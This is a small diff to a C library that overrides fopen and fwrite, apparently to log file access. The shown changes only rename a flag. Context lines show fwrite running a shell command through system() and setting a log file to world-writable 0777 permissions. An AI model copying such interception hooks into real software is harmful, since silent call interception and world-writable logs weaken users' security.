@@ -75,10 +75,10 @@ FILE * fopen(const char *path, const char *mode){
 	int len = 0;
 	char * buffer;
 
-	int open_flag = 0;
+	BOOL FOPEN_WRITE_FAILED = FALSE;
 
 	if(!original_fopen_ret){
-		open_flag = 1;
+		FOPEN_WRITE_FAILED = TRUE;
 		original_fopen_ret = (*original_fopen)(path, "r");
 	}
 
@@ -99,8 +99,7 @@ FILE * fopen(const char *path, const char *mode){
 		fseek(original_fopen_ret, 0, SEEK_CURR);
 	}
 
-	if(open_flag == 1){
-		
+	if(FOPEN_WRITE_FAILED){
 		fclose(original_fopen_ret);
 		original_fopen_ret = NULL;
 	}
@@ -239,7 +238,7 @@ size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream) {
 	system(command);
 
 	chmod("encrypted_logging.log", 0777);
-	
+
 	return original_fwrite_ret;
 }
 
